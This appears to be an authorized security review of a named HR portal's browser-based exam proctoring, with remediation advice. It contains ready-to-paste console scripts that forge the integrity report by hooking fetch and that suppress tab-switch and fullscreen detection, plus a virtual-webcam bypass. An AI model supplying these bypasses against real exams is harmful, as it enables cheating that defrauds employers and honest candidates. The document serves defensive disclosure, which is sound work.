# Client-side proctoring: bypass flow + remediation

Authorized review of the team's own Elite HR portal. This documents exactly how a
candidate can defeat the current proctoring during a live exam, so the team can fix it.
No attacks were run against the live site; this is derived from the shipped bundle.

## Root cause
All proctoring runs in the browser and only an **aggregate, client-supplied summary**
is sent once, at submit. The server trusts it. From the bundle:

```js
const e = u.getState().proctoring;            // client state
submit({ body: { questions: f, faceapi_attributes: {
  ideal_environment:       e.noFace,
  multiple_faces_detected: e.multipleFaces,
  tab_switching:           e.windowUnfocus + e.exitFullScreen,
}}});
// POST https://api.elitehr.nxtagent.ai/primehire/api/v1/candidate/submit  (cookie auth, 201 OK)
```

- Face checks: face-api.js (`SsdMobilenet`/`TinyFaceDetector`) models loaded from the
  public object store, run locally; results only bump counters + show a toast.
- Focus/fullscreen: `visibilitychange`, `window.blur`, `fullscreenchange` bump counters.
- No webcam frames/recording appear to be streamed to the server for independent review.

## Timing: proctoring is sent ONLY at the final submit
The entire candidate flow makes just 5 API calls: `check-login-status`, `instructions`,
`login`, `questions`, `submit`. The proctoring counters (`u.getState().proctoring`) are
read and transmitted **only** in the final `POST /candidate/submit`. There is no mid-exam
upload, heartbeat, per-question report, or webcam streaming — the counters live in browser
memory for the whole exam and are never seen by the server until that one request.

Consequences:
- The candidate need not behave during the exam; nothing is observed in real time.
- The `fetch` hook in Method 1 only has to be in place before that single submit. Because
  the app is a SPA (client-side routing, no full page reloads), pasting it once on the
  login/instructions screen persists through to submit.
- That same final POST also carries every answer (`questions: f`), so one request body
  controls answers AND the integrity report; it can be crafted directly with the cookie.

Fix implication: moving `faceapi_attributes` to "before submit" or sending it continuously
does NOT help — any client-sent value is forgeable. The verdict must be computed
server-side from uploaded evidence (see remediation below).

## Attacker flow during an exam

### Method 1 — Forge the integrity report at submit (most reliable; defeats everything)
The candidate behaves however they like (looks away, phone, second monitor, other people
in the room, switches tabs), then strips the evidence before it is sent.

Paste once at the start of the exam (DevTools console):

```js
const _fetch = window.fetch;
window.fetch = (url, opts = {}) => {
  if (typeof url === "string" && url.includes("/candidate/submit") && opts.body) {
    try {
      const b = JSON.parse(opts.body);
      if (b.faceapi_attributes) {
        b.faceapi_attributes = { ideal_environment: 0, multiple_faces_detected: 0, tab_switching: 0 };
        opts.body = JSON.stringify(b);
      }
    } catch {}
  }
  return _fetch(url, opts);
};
```

Equivalent: intercept with Burp/mitmproxy/browser local-overrides, or replay the POST via
curl/Postman with the session cookie and a clean body. Result: a perfectly clean record.

### Method 2 — Neutralize the detectors so counters never rise
```js
for (const ev of ["visibilitychange","blur","fullscreenchange","webkitfullscreenchange"]) {
  document.addEventListener(ev, e => e.stopImmediatePropagation(), true);
  window.addEventListener(ev,  e => e.stopImmediatePropagation(), true);
}
```
Also block the face model: DevTools → Network → right-click the `.../frontend/models/faceapi-v1`
request → "Block request URL". With models blocked, no-face/multiple-faces never flag.

### Method 3 — Defeat camera checks physically
Feed a virtual webcam (e.g. OBS Virtual Camera) showing one still face. face-api always sees
exactly one face, so `noFace`/`multipleFaces` stay 0 while the real candidate is off-camera
or assisted.

All three work for the same reason: the server accepts `u.getState().proctoring` as truth.

## Remediation flow (server-side)
1. **Collect evidence server-side.** Upload periodic webcam frames and/or the full recording
   to the backend via short-lived signed upload URLs; run face / multiple-face detection on
   the server. Do not accept `faceapi_attributes` from the client as truth (store as a hint
   only, or drop it).
2. **Derive the verdict from observed data**, never from request body fields. Ignore any
   client-sent integrity verdict.
3. **Bind proctoring to the graded artifact.** Grade spoken answers server-side from the
   uploaded audio and correlate timestamps with proctoring frames, so a submission cannot be
   "clean" without matching evidence.
4. **Downgrade browser-only signals.** Treat tab-switch / fullscreen-exit as weak hints;
   never gate pass/fail solely on them. Flag anomalous sessions for human review.
5. **Remove in-page question/answer exposure.** Delete the embedded RSA private key +
   client-side token decryption and the `console.log("Assessment"/"Decrypted tokens")` dumps,
   so answers/questions aren't available in-page to script against.
